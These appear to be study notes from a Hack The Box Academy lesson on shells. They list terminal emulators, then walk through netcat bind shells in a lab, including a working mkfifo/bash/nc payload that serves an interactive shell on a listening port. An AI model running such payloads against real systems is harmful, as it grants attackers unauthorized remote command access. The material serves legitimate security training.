Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators:

| **Terminal Emulator**                                          | **Operating System**     |
| :------------------------------------------------------------- | :----------------------- |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app)                                     | Windows                  |
| [PuTTY](https://www.putty.org)                                 | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org)                             | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))   | MacOS                    |
| [iTerm2](https://iterm2.com)                                   | MacOS                    |

---

#### Shell Validation From 'ps'

```bash
OathBornX@htb[/htb]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

We can also find out what shell language is in use by viewing the environment variables using the `env` command:

#### Shell Validation Using 'env'

```bash
OathBornX@htb[/htb]$ env

SHELL=/bin/bash
```

---

# Bind Shell

A `bind shell` is when the **target machine** opens a `network port` and waits for the **attacker to connect**. Once connected, the attacker gains a remote command interface on the target.

- Common in `post-exploitation` where the target listens on a port (e.g., 4444) for an incoming connection.
- Typically established using tools like `nc`, `bash`, or `PowerShell`.
- Easier to detect since the victim’s system exposes a listening port.
- Often blocked by `firewalls` that restrict inbound traffic.

#### No. 1: Server - Target starting Netcat listener

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the `target` will be our server, and the `attack box` will be our` client`. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

#### No. 2: Client - Attack box connecting to target

```bash
OathBornX@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server, as seen below.

#### No. 3: Server - Target receiving connection from client

Bind Shells

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

#### No. 4: Client - Attack box sending message Hello Academy

```bash
OathBornX@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Once we type the message and hit enter, we will notice the message is received on the server-side.

#### No. 5: Server - Target receiving Hello Academy message

```bash
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

---

## Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

#### No. 1: Server - Binding a Bash shell to the TCP session

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target

```bash
OathBornX@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```
